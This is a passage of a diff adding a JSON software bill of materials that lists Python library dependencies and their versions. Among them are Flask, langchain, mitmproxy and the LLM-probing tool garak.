@@ -1,0 +1,3543 @@
+{
+  "components": [
+    {
+      "bom-ref": "BomRef.09444145998354614.6364215990415449",
+      "name": "Brotli",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.9661979695235267.2509931699591792",
+      "name": "CacheControl",
+      "type": "library",
+      "version": "0.14.4"
+    },
+    {
+      "bom-ref": "BomRef.3615085451564528.5376319903734488",
+      "name": "ConfigArgParse",
+      "type": "library",
+      "version": "1.7.5"
+    },
+    {
+      "bom-ref": "BomRef.8910781842489853.3663311440346493",
+      "name": "DateTime",
+      "type": "library",
+      "version": "6.0"
+    },
+    {
+      "bom-ref": "BomRef.8373567868089459.6709728039086675",
+      "name": "Flask",
+      "type": "library",
+      "version": "3.1.3"
+    },
+    {
+      "bom-ref": "BomRef.24457012243570275.7647326532370963",
+      "name": "Flask-Login",
+      "type": "library",
+      "version": "0.6.3"
+    },
+    {
+      "bom-ref": "BomRef.37506384201125376.9043465716049228",
+      "name": "GitPython",
+      "type": "library",
+      "version": "3.1.50"
+    },
+    {
+      "bom-ref": "BomRef.12384946189040691.8272515220722164",
+      "name": "Jinja2",
+      "type": "library",
+      "version": "3.1.6"
+    },
+    {
+      "bom-ref": "BomRef.1355505135341083.6288641881886422",
+      "name": "Markdown",
+      "type": "library",
+      "version": "3.10.2"
+    },
+    {
+      "bom-ref": "BomRef.5768920639441159.08447214185268304",
+      "name": "MarkupSafe",
+      "type": "library",
+      "version": "3.0.3"
+    },
+    {
+      "bom-ref": "BomRef.23212764483618487.7107080809527778",
+      "name": "PyJWT",
+      "type": "library",
+      "version": "2.13.0"
+    },
+    {
+      "bom-ref": "BomRef.6461190642373329.6735013764630758",
+      "name": "PySocks",
+      "type": "library",
+      "version": "1.7.1"
+    },
+    {
+      "bom-ref": "BomRef.26875186246925187.8400779823824858",
+      "name": "PyYAML",
+      "type": "library",
+      "version": "6.0.3"
+    },
+    {
+      "bom-ref": "BomRef.5748470139881682.06155395533307084",
+      "name": "Pygments",
+      "type": "library",
+      "version": "2.20.0"
+    },
+    {
+      "bom-ref": "BomRef.290238165799093.014209294475056256",
+      "name": "SQLAlchemy",
+      "type": "library",
+      "version": "2.0.50"
+    },
+    {
+      "bom-ref": "BomRef.411481874808426.3828838783724693",
+      "name": "SecretStorage",
+      "type": "library",
+      "version": "3.5.0"
+    },
+    {
+      "bom-ref": "BomRef.28767277992054563.5162198340070271",
+      "name": "Send2Trash",
+      "type": "library",
+      "version": "2.1.0"
+    },
+    {
+      "bom-ref": "BomRef.48847732083717466.3434180386222593",
+      "name": "Werkzeug",
+      "type": "library",
+      "version": "3.1.8"
+    },
+    {
+      "bom-ref": "BomRef.9068502138024465.28751319890462224",
+      "name": "accelerate",
+      "type": "library",
+      "version": "1.13.0"
+    },
+    {
+      "bom-ref": "BomRef.7765049007520466.341992483804059",
+      "name": "aiohappyeyeballs",
+      "type": "library",
+      "version": "2.6.2"
+    },
+    {
+      "bom-ref": "BomRef.8816560678213072.23204272929621228",
+      "name": "aiohttp",
+      "type": "library",
+      "version": "3.13.5"
+    },
+    {
+      "bom-ref": "BomRef.3982376358356958.047500552984714006",
+      "name": "aioquic",
+      "type": "library",
+      "version": "1.2.0"
+    },
+    {
+      "bom-ref": "BomRef.1489792443303387.6420252751123592",
+      "name": "aiosignal",
+      "type": "library",
+      "version": "1.4.0"
+    },
+    {
+      "bom-ref": "BomRef.930874262106103.5351039699180794",
+      "name": "annotated-doc",
+      "type": "library",
+      "version": "0.0.4"
+    },
+    {
+      "bom-ref": "BomRef.5851585329962639.14402496146256838",
+      "name": "annotated-types",
+      "type": "library",
+      "version": "0.7.0"
+    },
+    {
+      "bom-ref": "BomRef.21126597818036497.9096407236280888",
+      "name": "anthropic",
+      "type": "library",
+      "version": "0.49.0"
+    },
+    {
+      "bom-ref": "BomRef.32166330589131575.32264405345155867",
+      "name": "anyio",
+      "type": "library",
+      "version": "4.13.0"
+    },
+    {
+      "bom-ref": "BomRef.5463111830903846.2777140088863932",
+      "name": "appdirs",
+      "type": "library",
+      "version": "1.4.4"
+    },
+    {
+      "bom-ref": "BomRef.7268849862896462.4614957029128607",
+      "name": "archspec",
+      "type": "library",
+      "version": "0.2.5"
+    },
+    {
+      "bom-ref": "BomRef.17052902945555615.6130877300062175",
+      "name": "argon2-cffi",
+      "type": "library",
+      "version": "25.1.0"
+    },
+    {
+      "bom-ref": "BomRef.6984671052063214.5379121512553492",
+      "name": "argon2-cffi-bindings",
+      "type": "library",
+      "version": "25.1.0"
+    },
+    {
+      "bom-ref": "BomRef.7281311066921166.15024079974203364",
+      "name": "arrow",
+      "type": "library",
+      "version": "1.4.0"
+    },
+    {
+      "bom-ref": "BomRef.3267383709390318.10881139618096447",
+      "name": "asgiref",
+      "type": "library",
+      "version": "3.11.1"
+    },
+    {
+      "bom-ref": "BomRef.3146996572887166.9303203761387282",
+      "name": "asttokens",
+      "type": "library",
+      "version": "3.0.1"
+    },
+    {
+      "bom-ref": "BomRef.5790801134093788.8440681609859554",
+      "name": "async-lru",
+      "type": "library",
+      "version": "2.3.0"
+    },
+    {
+      "bom-ref": "BomRef.16554542727465882.9840893785978595",
+      "name": "asyncer",
+      "type": "library",
+      "version": "0.0.8"
+    },
+    {
+      "bom-ref": "BomRef.005892032658129542.8083647876418562",
+      "name": "attrdict",
+      "type": "library",
+      "version": "2.0.1"
+    },
+    {
+      "bom-ref": "BomRef.5238242673047342.30957813612307195",
+      "name": "attrs",
+      "type": "library",
+      "version": "26.1.0"
+    },
+    {
+      "bom-ref": "BomRef.6540543090658728.23746395400420983",
+      "name": "avidtools",
+      "type": "library",
+      "version": "0.1.2"
+    },
+    {
+      "bom-ref": "BomRef.4586423950982197.18964855935840885",
+      "name": "babel",
+      "type": "library",
+      "version": "2.18.0"
+    },
+    {
+      "bom-ref": "BomRef.9093916872720057.3329675697949561",
+      "name": "backoff",
+      "type": "library",
+      "version": "2.2.1"
+    },
+    {
+      "bom-ref": "BomRef.6175165726390688.4770909738566187",
+      "name": "bcrypt",
+      "type": "library",
+      "version": "5.0.0"
+    },
+    {
+      "bom-ref": "BomRef.7048161379368484.5580506367243441",
+      "name": "beautifulsoup4",
+      "type": "library",
+      "version": "4.15.0"
+    },
+    {
+      "bom-ref": "BomRef.2963572516763672.5587348414342084",
+      "name": "bidict",
+      "type": "library",
+      "version": "0.23.1"
+    },
+    {
+      "bom-ref": "BomRef.6686177303000416.18426910380583272",
+      "name": "bleach",
+      "type": "library",
+      "version": "6.4.0"
+    },
+    {
+      "bom-ref": "BomRef.003145450410379058.8487273468766864",
+      "name": "blinker",
+      "type": "library",
+      "version": "1.9.0"
+    },
+    {
+      "bom-ref": "BomRef.19732399514214738.742771406514109",
+      "name": "blis",
+      "type": "library",
+      "version": "1.3.3"
+    },
+    {
+      "bom-ref": "BomRef.678152264465058.9265382921638989",
+      "name": "bogrod",
+      "type": "library",
+      "version": "0.4.5"
+    },
+    {
+      "bom-ref": "BomRef.813117098158888.01793969465458356",
+      "name": "boltons",
+      "type": "library",
+      "version": "25.0.0"
+    },
+    {
+      "bom-ref": "BomRef.685327237228056.5220117148160999",
+      "name": "boolean.py",
+      "type": "library",
+      "version": "5.0"
+    },
+    {
+      "bom-ref": "BomRef.8593819797091637.9391088745736744",
+      "name": "boto3",
+      "type": "library",
+      "version": "1.43.17"
+    },
+    {
+      "bom-ref": "BomRef.4208667665655016.14099852906648203",
+      "name": "botocore",
+      "type": "library",
+      "version": "1.43.17"
+    },
+    {
+      "bom-ref": "BomRef.4387003491312964.25417597425390337",
+      "name": "cachetools",
+      "type": "library",
+      "version": "7.1.4"
+    },
+    {
+      "bom-ref": "BomRef.3473755733169611.9001761725694478",
+      "name": "catalogue",
+      "type": "library",
+      "version": "2.0.10"
+    },
+    {
+      "bom-ref": "BomRef.32723308668471973.6188196777319408",
+      "name": "certifi",
+      "type": "library",
+      "version": "2025.8.3"
+    },
+    {
+      "bom-ref": "BomRef.10338634891695131.198209221434817",
+      "name": "cffi",
+      "type": "library",
+      "version": "2.0.0"
+    },
+    {
+      "bom-ref": "BomRef.9322051030240351.012746026992271897",
+      "name": "charset-normalizer",
+      "type": "library",
+      "version": "3.4.3"
+    },
+    {
+      "bom-ref": "BomRef.8702566634078012.5429620677969793",
+      "name": "click",
+      "type": "library",
+      "version": "8.4.1"
+    },
+    {
+      "bom-ref": "BomRef.5826240834214182.9867891345306227",
+      "name": "cloudpathlib",
+      "type": "library",
+      "version": "0.24.0"
+    },
+    {
+      "bom-ref": "BomRef.0935015732957688.07519468933018303",
+      "name": "cloudpickle",
+      "type": "library",
+      "version": "3.1.2"
+    },
+    {
+      "bom-ref": "BomRef.15822039109672825.4502041617944813",
+      "name": "cmd2",
+      "type": "library",
+      "version": "2.4.3"
+    },
+    {
+      "bom-ref": "BomRef.7916719846008354.03900218135610278",
+      "name": "cohere",
+      "type": "library",
+      "version": "7.0.1"
+    },
+    {
+      "bom-ref": "BomRef.9054813023711691.5100821032959164",
+      "name": "colorama",
+      "type": "library",
+      "version": "0.4.6"
+    },
+    {
+      "bom-ref": "BomRef.45410139898371693.9511101213305677",
+      "name": "comm",
+      "type": "library",
+      "version": "0.2.3"
+    },
+    {
+      "bom-ref": "BomRef.6444375003332106.5330259910522174",
+      "name": "conda-package-handling",
+      "type": "library",
+      "version": "2.4.0"
+    },
+    {
+      "bom-ref": "BomRef.9838030987243598.2635616009849452",
+      "name": "conda_package_streaming",
+      "type": "library",
+      "version": "0.12.0"
+    },
+    {
+      "bom-ref": "BomRef.2137071310160905.7848870076523949",
+      "name": "confection",
+      "type": "library",
+      "version": "1.3.3"
+    },
+    {
+      "bom-ref": "BomRef.761473857096838.5721359710135467",
+      "name": "cryptography",
+      "type": "library",
+      "version": "48.0.0"
+    },
+    {
+      "bom-ref": "BomRef.4572663536004936.37650963538132565",
+      "name": "cyclonedx-python-lib",
+      "type": "library",
+      "version": "11.7.0"
+    },
+    {
+      "bom-ref": "BomRef.28397036811018794.15927605048434157",
+      "name": "cymem",
+      "type": "library",
+      "version": "2.0.13"
+    },
+    {
+      "bom-ref": "BomRef.0017779829651557444.9240534020097332",
+      "name": "datasets",
+      "type": "library",
+      "version": "3.6.0"
+    },
+    {
+      "bom-ref": "BomRef.5009541823447522.34499396524627746",
+      "name": "debugpy",
+      "type": "library",
+      "version": "1.8.21"
+    },
+    {
+      "bom-ref": "BomRef.5774068705650595.535163407453712",
+      "name": "decorator",
+      "type": "library",
+      "version": "5.3.1"
+    },
+    {
+      "bom-ref": "BomRef.41422304286836453.8444512115142646",
+      "name": "deepeval",
+      "type": "library",
+      "version": "2.9.3"
+    },
+    {
+      "bom-ref": "BomRef.7322582641247862.5436211786693704",
+      "name": "deepl",
+      "type": "library",
+      "version": "1.17.0"
+    },
+    {
+      "bom-ref": "BomRef.8058745652980667.29519231351232966",
+      "name": "defusedxml",
+      "type": "library",
+      "version": "0.7.1"
+    },
+    {
+      "bom-ref": "BomRef.11246269684467414.2731131436010631",
+      "name": "dill",
+      "type": "library",
+      "version": "0.3.8"
+    },
+    {
+      "bom-ref": "BomRef.9222667672474304.5194057883850017",
+      "name": "diskcache",
+      "type": "library",
+      "version": "5.6.3"
+    },
+    {
+      "bom-ref": "BomRef.6485032474036267.9886401907117435",
+      "name": "distro",
+      "type": "library",
+      "version": "1.9.0"
+    },
+    {
+      "bom-ref": "BomRef.4718493728332459.6599608777750945",
+      "name": "docstring_parser",
+      "type": "library",
+      "version": "0.18.0"
+    },
+    {
+      "bom-ref": "BomRef.29166104029695217.5260973907545485",
+      "name": "dspy",
+      "type": "library",
+      "version": "3.2.1"
+    },
+    {
+      "bom-ref": "BomRef.5372835282185437.5903053429606883",
+      "name": "ecoji",
+      "type": "library",
+      "version": "0.1.1"
+    },
+    {
+      "bom-ref": "BomRef.7652233465699889.033722479601582256",
+      "name": "eval_type_backport",
+      "type": "library",
+      "version": "0.3.1"
+    },
+    {
+      "bom-ref": "BomRef.18566396366302507.8051252815724302",
+      "name": "execnet",
+      "type": "library",
+      "version": "2.1.2"
+    },
+    {
+      "bom-ref": "BomRef.6228322772376608.3939631851304315",
+      "name": "executing",
+      "type": "library",
+      "version": "2.2.1"
+    },
+    {
+      "bom-ref": "BomRef.3532301250834392.0784492646752355",
+      "name": "fastavro",
+      "type": "library",
+      "version": "1.12.2"
+    },
+    {
+      "bom-ref": "BomRef.4203008889929707.8293181814291419",
+      "name": "fastjsonschema",
+      "type": "library",
+      "version": "2.21.2"
+    },
+    {
+      "bom-ref": "BomRef.09736447814300042.05253626401651612",
+      "name": "fastuuid",
+      "type": "library",
+      "version": "0.14.0"
+    },
+    {
+      "bom-ref": "BomRef.9343725663903345.7245170291699626",
+      "name": "filelock",
+      "type": "library",
+      "version": "3.29.0"
+    },
+    {
+      "bom-ref": "BomRef.505867576565673.6716557117953426",
+      "name": "flask-cors",
+      "type": "library",
+      "version": "6.0.2"
+    },
+    {
+      "bom-ref": "BomRef.9384595088489004.9686825031117673",
+      "name": "fqdn",
+      "type": "library",
+      "version": "1.5.1"
+    },
+    {
+      "bom-ref": "BomRef.7452545879402975.6376656976625008",
+      "name": "frozendict",
+      "type": "library",
+      "version": "2.4.6"
+    },
+    {
+      "bom-ref": "BomRef.2295193429857827.01428819284435534",
+      "name": "frozenlist",
+      "type": "library",
+      "version": "1.8.0"
+    },
+    {
+      "bom-ref": "BomRef.7210691142234543.4089236189505814",
+      "name": "fsspec",
+      "type": "library",
+      "version": "2025.3.0"
+    },
+    {
+      "bom-ref": "BomRef.11742706135811654.6858361316795386",
+      "name": "ftfy",
+      "type": "library",
+      "version": "6.3.1"
+    },
+    {
+      "bom-ref": "BomRef.14246881905223296.8119393694717074",
+      "name": "garak",
+      "type": "library",
+      "version": "0.15.0"
+    },
+    {
+      "bom-ref": "BomRef.016282255076969898.7200312167028674",
+      "name": "gepa",
+      "type": "library",
+      "version": "0.0.27"
+    },
+    {
+      "bom-ref": "BomRef.7358251255538044.5634194626659339",
+      "name": "gevent",
+      "type": "library",
+      "version": "25.9.1"
+    },
+    {
+      "bom-ref": "BomRef.3470316674495193.5139235577588205",
+      "name": "geventhttpclient",
+      "type": "library",
+      "version": "2.3.9"
+    },
+    {
+      "bom-ref": "BomRef.8170747936854401.04054620911375084",
+      "name": "gitdb",
+      "type": "library",
+      "version": "4.0.12"
+    },
+    {
+      "bom-ref": "BomRef.6698483671929538.9653892868675893",
+      "name": "google-api-core",
+      "type": "library",
+      "version": "2.30.3"
+    },
+    {
+      "bom-ref": "BomRef.3723327241497174.309097402086294",
+      "name": "google-api-python-client",
+      "type": "library",
+      "version": "2.197.0"
+    },
+    {
+      "bom-ref": "BomRef.09177584847033238.70015606961183",
+      "name": "google-auth",
+      "type": "library",
+      "version": "2.53.0"
+    },
+    {
+      "bom-ref": "BomRef.8223642798415424.10570111062089349",
+      "name": "google-auth-httplib2",
+      "type": "library",
+      "version": "0.4.0"
+    },
+    {
+      "bom-ref": "BomRef.2652226303293489.2398039846203388",
+      "name": "google-cloud-core",
+      "type": "library",
+      "version": "2.6.0"
+    },
+    {
+      "bom-ref": "BomRef.26780455877374176.04738862071918648",
+      "name": "google-cloud-translate",
+      "type": "library",
+      "version": "3.26.0"
+    },
+    {
+      "bom-ref": "BomRef.7302783961017599.7048558970411701",
+      "name": "google-genai",
+      "type": "library",
+      "version": "1.75.0"
+    },
+    {
+      "bom-ref": "BomRef.6288296886877667.5449258659724345",
+      "name": "googleapis-common-protos",
+      "type": "library",
+      "version": "1.75.0"
+    },
+    {
+      "bom-ref": "BomRef.1550531376037534.8666194501174131",
+      "name": "greenlet",
+      "type": "library",
+      "version": "3.5.1"
+    },
+    {
+      "bom-ref": "BomRef.2961402396529693.851444420697022",
+      "name": "grpc-google-iam-v1",
+      "type": "library",
+      "version": "0.14.4"
+    },
+    {
+      "bom-ref": "BomRef.07052823218114124.2919568246686923",
+      "name": "grpcio",
+      "type": "library",
+      "version": "1.80.0"
+    },
+    {
+      "bom-ref": "BomRef.6429422437189334.05896434286260843",
+      "name": "grpcio-status",
+      "type": "library",
+      "version": "1.80.0"
+    },
+    {
+      "bom-ref": "BomRef.334587743139923.315512522877189",
+      "name": "grpcio-tools",
+      "type": "library",
+      "version": "1.80.0"
+    },
+    {
+      "bom-ref": "BomRef.2067921432836719.24839245748935335",
+      "name": "h11",
+      "type": "library",
+      "version": "0.16.0"
+    },
+    {
+      "bom-ref": "BomRef.9592289207934286.37516811701254804",
+      "name": "h2",
+      "type": "library",
+      "version": "4.3.0"
+    },
+    {
+      "bom-ref": "BomRef.10325493459532153.8977535689774467",
+      "name": "hf-xet",
+      "type": "library",
+      "version": "1.5.0"
+    },
+    {
+      "bom-ref": "BomRef.38437526191247384.004392849404481702",
+      "name": "hpack",
+      "type": "library",
+      "version": "4.1.0"
+    },
+    {
+      "bom-ref": "BomRef.33314542642499156.9077398292916854",
+      "name": "httpcore",
+      "type": "library",
+      "version": "1.0.9"
+    },
+    {
+      "bom-ref": "BomRef.2209968963063096.43647424375769595",
+      "name": "httplib2",
+      "type": "library",
+      "version": "0.31.2"
+    },
+    {
+      "bom-ref": "BomRef.45926366237618754.18848025185914263",
+      "name": "httpx",
+      "type": "library",
+      "version": "0.28.1"
+    },
+    {
+      "bom-ref": "BomRef.9336936343715291.8923109232951609",
+      "name": "httpx-sse",
+      "type": "library",
+      "version": "0.4.3"
+    },
+    {
+      "bom-ref": "BomRef.06262618373286521.2407643969172758",
+      "name": "huggingface_hub",
+      "type": "library",
+      "version": "1.17.0"
+    },
+    {
+      "bom-ref": "BomRef.8472962699608193.2934568320108283",
+      "name": "hyperframe",
+      "type": "library",
+      "version": "6.1.0"
+    },
+    {
+      "bom-ref": "BomRef.9687249367495939.1447691742833228",
+      "name": "idna",
+      "type": "library",
+      "version": "3.10"
+    },
+    {
+      "bom-ref": "BomRef.7273849892805279.6325004084240792",
+      "name": "importlib_metadata",
+      "type": "library",
+      "version": "8.9.0"
+    },
+    {
+      "bom-ref": "BomRef.010154486488466952.3526646676370784",
+      "name": "iniconfig",
+      "type": "library",
+      "version": "2.3.0"
+    },
+    {
+      "bom-ref": "BomRef.5449242339411928.23832487857315476",
+      "name": "instructor",
+      "type": "library",
+      "version": "1.15.1"
+    },
+    {
+      "bom-ref": "BomRef.9336170147130805.7011528964754757",
+      "name": "ipykernel",
+      "type": "library",
+      "version": "7.3.0"
+    },
+    {
+      "bom-ref": "BomRef.32417504882966597.6504344414140852",
+      "name": "ipython",
+      "type": "library",
+      "version": "9.13.0"
+    },
+    {
+      "bom-ref": "BomRef.49943049250835514.7514483360394814",
+      "name": "ipython_pygments_lexers",
+      "type": "library",
+      "version": "1.1.1"
+    },
+    {
+      "bom-ref": "BomRef.4279613999652101.3992802392265955",
+      "name": "ipywidgets",
+      "type": "library",
+      "version": "8.1.8"
+    },
+    {
+      "bom-ref": "BomRef.7456085849017007.011753800618366506",
+      "name": "isoduration",
+      "type": "library",
+      "version": "20.11.0"
+    },
+    {
+      "bom-ref": "BomRef.4744781349454962.40217015563630787",
+      "name": "itsdangerous",
+      "type": "library",
+      "version": "2.2.0"
+    },
+    {
+      "bom-ref": "BomRef.6371117874664933.04401054078701849",
+      "name": "jaraco.classes",
+      "type": "library",
+      "version": "3.4.0"
+    },
+    {
+      "bom-ref": "BomRef.4342076651682131.21690725576926673",
+      "name": "jaraco.context",
+      "type": "library",
+      "version": "6.1.2"
+    },
+    {
+      "bom-ref": "BomRef.18638882238546917.874674103629944",
+      "name": "jaraco.functools",
+      "type": "library",
+      "version": "4.5.0"
+    },
+    {
+      "bom-ref": "BomRef.7667236781064719.028458090738603836",
+      "name": "jedi",
+      "type": "library",
+      "version": "0.20.0"
+    },
+    {
+      "bom-ref": "BomRef.10851007190791406.33197246456153984",
+      "name": "jeepney",
+      "type": "library",
+      "version": "0.9.0"
+    },
+    {
+      "bom-ref": "BomRef.988650155567904.8386361096330492",
+      "name": "jiter",
+      "type": "library",
+      "version": "0.13.0"
+    },
+    {
+      "bom-ref": "BomRef.9456370722121902.4816657711517901",
+      "name": "jmespath",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.4485779396483873.8129747844177615",
+      "name": "joblib",
+      "type": "library",
+      "version": "1.5.3"
+    },
+    {
+      "bom-ref": "BomRef.24098521751343494.5947270938035923",
+      "name": "json5",
+      "type": "library",
+      "version": "0.14.0"
+    },
+    {
+      "bom-ref": "BomRef.17681384238750208.2658779804842276",
+      "name": "json_repair",
+      "type": "library",
+      "version": "0.59.10"
+    },
+    {
+      "bom-ref": "BomRef.35872574899681686.5545983332197182",
+      "name": "jsonpatch",
+      "type": "library",
+      "version": "1.33"
+    },
+    {
+      "bom-ref": "BomRef.841607347107142.4495215404845586",
+      "name": "jsonpath-ng",
+      "type": "library",
+      "version": "1.8.0"
+    },
+    {
+      "bom-ref": "BomRef.3433712075905734.9728119525898922",
+      "name": "jsonpath-python",
+      "type": "library",
+      "version": "1.1.6"
+    },
+    {
+      "bom-ref": "BomRef.31385868342907564.7732575575094212",
+      "name": "jsonpointer",
+      "type": "library",
+      "version": "3.0.0"
+    },
+    {
+      "bom-ref": "BomRef.44559445016458554.5845598997211571",
+      "name": "jsonschema",
+      "type": "library",
+      "version": "4.26.0"
+    },
+    {
+      "bom-ref": "BomRef.23366707260732333.010393571782465028",
+      "name": "jsonschema-specifications",
+      "type": "library",
+      "version": "2025.9.1"
+    },
+    {
+      "bom-ref": "BomRef.8948609131463748.47865356064861797",
+      "name": "jupyter-events",
+      "type": "library",
+      "version": "0.12.1"
+    },
+    {
+      "bom-ref": "BomRef.5630927283423055.9437971197845166",
+      "name": "jupyter-lsp",
+      "type": "library",
+      "version": "2.3.1"
+    },
+    {
+      "bom-ref": "BomRef.19828594182433756.68338594930401",
+      "name": "jupyter_client",
+      "type": "library",
+      "version": "8.9.1"
+    },
+    {
+      "bom-ref": "BomRef.8573132819289329.04405311175946236",
+      "name": "jupyter_core",
+      "type": "library",
+      "version": "5.8.1"
+    },
+    {
+      "bom-ref": "BomRef.5563040679639623.8860460765578066",
+      "name": "jupyter_server",
+      "type": "library",
+      "version": "2.19.0"
+    },
+    {
+      "bom-ref": "BomRef.9708146598351138.44032328870595194",
+      "name": "jupyter_server_terminals",
+      "type": "library",
+      "version": "0.5.4"
+    },
+    {
+      "bom-ref": "BomRef.43473010646745036.8478663837530032",
+      "name": "jupyterlab",
+      "type": "library",
+      "version": "4.5.8"
+    },
+    {
+      "bom-ref": "BomRef.4311480650420334.640217068555419",
+      "name": "jupyterlab_pygments",
+      "type": "library",
+      "version": "0.3.0"
+    },
+    {
+      "bom-ref": "BomRef.34956817195670786.5743547557006515",
+      "name": "jupyterlab_server",
+      "type": "library",
+      "version": "2.28.0"
+    },
+    {
+      "bom-ref": "BomRef.811046580613624.4143670359267748",
+      "name": "jupyterlab_widgets",
+      "type": "library",
+      "version": "3.0.16"
+    },
+    {
+      "bom-ref": "BomRef.19040914936702158.8381019429505314",
+      "name": "kaitaistruct",
+      "type": "library",
+      "version": "0.11"
+    },
+    {
+      "bom-ref": "BomRef.5435348315733365.3494124719869227",
+      "name": "keyring",
+      "type": "library",
+      "version": "25.7.0"
+    },
+    {
+      "bom-ref": "BomRef.6557836122287675.4294220273091769",
+      "name": "langchain",
+      "type": "library",
+      "version": "1.3.2"
+    },
+    {
+      "bom-ref": "BomRef.8885166861113051.5279387129118082",
+      "name": "langchain-classic",
+      "type": "library",
+      "version": "1.0.7"
+    },
+    {
+      "bom-ref": "BomRef.75987137589612.4077066870823103",
+      "name": "langchain-community",
+      "type": "library",
+      "version": "0.4.2"
+    },
+    {
+      "bom-ref": "BomRef.3241547980546742.19848044266631637",
+      "name": "langchain-core",
+      "type": "library",
+      "version": "1.4.0"
+    },
+    {
+      "bom-ref": "BomRef.1338296797948879.5331119455395564",
+      "name": "langchain-openai",
+      "type": "library",
+      "version": "1.2.2"
+    },
+    {
+      "bom-ref": "BomRef.2944032199613651.571166625738238",
+      "name": "langchain-protocol",
+      "type": "library",
+      "version": "0.0.16"
+    },
+    {
+      "bom-ref": "BomRef.9662073394697025.24865555443876397",
+      "name": "langchain-text-splitters",
+      "type": "library",
+      "version": "1.1.2"
+    },
+    {
+      "bom-ref": "BomRef.1442054769246126.14998569573574827",
+      "name": "langdetect",
+      "type": "library",
+      "version": "1.0.9"
+    },
+    {
+      "bom-ref": "BomRef.7016817105710799.30650724749157776",
+      "name": "langgraph",
+      "type": "library",
+      "version": "1.2.2"
+    },
+    {
+      "bom-ref": "BomRef.8081877243231597.5092968403337687",
+      "name": "langgraph-checkpoint",
+      "type": "library",
+      "version": "4.1.1"
+    },
+    {
+      "bom-ref": "BomRef.06319531058942951.5687544412679161",
+      "name": "langgraph-prebuilt",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.754409554284475.5784670481064944",
+      "name": "langgraph-sdk",
+      "type": "library",
+      "version": "0.3.15"
+    },
+    {
+      "bom-ref": "BomRef.9274162826301039.6410544586896191",
+      "name": "langsmith",
+      "type": "library",
+      "version": "0.8.6"
+    },
+    {
+      "bom-ref": "BomRef.5334944336193773.7479119188141957",
+      "name": "lark",
+      "type": "library",
+      "version": "1.3.1"
+    },
+    {
+      "bom-ref": "BomRef.9701306255160884.5233335085825244",
+      "name": "ldap3",
+      "type": "library",
+      "version": "2.9.1"
+    },
+    {
+      "bom-ref": "BomRef.9337678789522266.20175990751529327",
+      "name": "license-expression",
+      "type": "library",
+      "version": "30.4.4"
+    },
+    {
+      "bom-ref": "BomRef.7926514950408837.13113854406218306",
+      "name": "linkify-it-py",
+      "type": "library",
+      "version": "2.1.0"
+    },
+    {
+      "bom-ref": "BomRef.9422698995064179.7347441187218848",
+      "name": "litellm",
+      "type": "library",
+      "version": "1.86.2"
+    },
+    {
+      "bom-ref": "BomRef.7482476015349585.4402205259170804",
+      "name": "locust",
+      "type": "library",
+      "version": "2.44.0"
+    },
+    {
+      "bom-ref": "BomRef.861082846952857.010389210417035333",
+      "name": "lorem",
+      "type": "library",
+      "version": "0.1.1"
+    },
+    {
+      "bom-ref": "BomRef.8319402348035155.10228700976665162",
+      "name": "markdown-it-py",
+      "type": "library",
+      "version": "4.2.0"
+    },
+    {
+      "bom-ref": "BomRef.01805950575734272.38510236795658437",
+      "name": "matplotlib-inline",
+      "type": "library",
+      "version": "0.2.2"
+    },
+    {
+      "bom-ref": "BomRef.12437448796311479.28804710443969717",
+      "name": "mdit-py-plugins",
+      "type": "library",
+      "version": "0.6.1"
+    },
+    {
+      "bom-ref": "BomRef.9070410012409861.6125228329166341",
+      "name": "mdurl",
+      "type": "library",
+      "version": "0.1.2"
+    },
+    {
+      "bom-ref": "BomRef.30745997145842163.6678328331664344",
+      "name": "mikeshardmind-base2048",
+      "type": "library",
+      "version": "1.0.4"
+    },
+    {
+      "bom-ref": "BomRef.41616039565265295.18861572227212786",
+      "name": "mistralai",
+      "type": "library",
+      "version": "1.5.2"
+    },
+    {
+      "bom-ref": "BomRef.9686473725515016.013255072972088167",
+      "name": "mistune",
+      "type": "library",
+      "version": "3.2.1"
+    },
+    {
+      "bom-ref": "BomRef.4164722017473196.8162399892286701",
+      "name": "mitmproxy",
+      "type": "library",
+      "version": "12.2.3"
+    },
+    {
+      "bom-ref": "BomRef.3963849206411214.08796815034995675",
+      "name": "mitmproxy_linux",
+      "type": "library",
+      "version": "0.12.9"
+    },
+    {
+      "bom-ref": "BomRef.579264171488519.8686211378119338",
+      "name": "mitmproxy_rs",
+      "type": "library",
+      "version": "0.12.9"
+    },
+    {
+      "bom-ref": "BomRef.8472967456786249.6973084347730804",
+      "name": "monotonic",
+      "type": "library",
+      "version": "1.6"
+    },
+    {
+      "bom-ref": "BomRef.6072419780578482.22221250975587437",
+      "name": "more-itertools",
+      "type": "library",
+      "version": "11.1.0"
+    },
+    {
+      "bom-ref": "BomRef.6496975321194057.1387237097740337",
+      "name": "mpmath",
+      "type": "library",
+      "version": "1.3.0"
+    },
+    {
+      "bom-ref": "BomRef.2352740422146954.3745541437141965",
+      "name": "msgpack",
+      "type": "library",
+      "version": "1.1.2"
+    },
+    {
+      "bom-ref": "BomRef.2250772045421825.030169959315049177",
+      "name": "multidict",
+      "type": "library",
+      "version": "6.7.1"
+    },
+    {
+      "bom-ref": "BomRef.779125728162439.4935373972250985",
+      "name": "multiprocess",
+      "type": "library",
+      "version": "0.70.16"
+    },
+    {
+      "bom-ref": "BomRef.12702052472199032.8232069640325718",
+      "name": "murmurhash",
+      "type": "library",
+      "version": "1.0.15"
+    },
+    {
+      "bom-ref": "BomRef.05837449668827466.8461939490514664",
+      "name": "mypy_extensions",
+      "type": "library",
+      "version": "1.1.0"
+    },
+    {
+      "bom-ref": "BomRef.2021792426497877.6623174370480466",
+      "name": "nbclient",
+      "type": "library",
+      "version": "0.11.0"
+    },
+    {
+      "bom-ref": "BomRef.06724512688769213.37786097972648136",
+      "name": "nbconvert",
+      "type": "library",
+      "version": "7.17.1"
+    },
+    {
+      "bom-ref": "BomRef.9271570650782665.19700047668194398",
+      "name": "nbformat",
+      "type": "library",
+      "version": "5.10.4"
+    },
+    {
+      "bom-ref": "BomRef.6451879738739895.4919543126124515",
+      "name": "nest-asyncio",
+      "type": "library",
+      "version": "1.6.0"
+    },
+    {
+      "bom-ref": "BomRef.720329640797332.7382830077292752",
+      "name": "nest-asyncio2",
+      "type": "library",
+      "version": "1.7.2"
+    },
+    {
+      "bom-ref": "BomRef.09798463972573956.6755810794920392",
+      "name": "networkx",
+      "type": "library",
+      "version": "3.6.1"
+    },
+    {
+      "bom-ref": "BomRef.1770343150578222.9624007689284747",
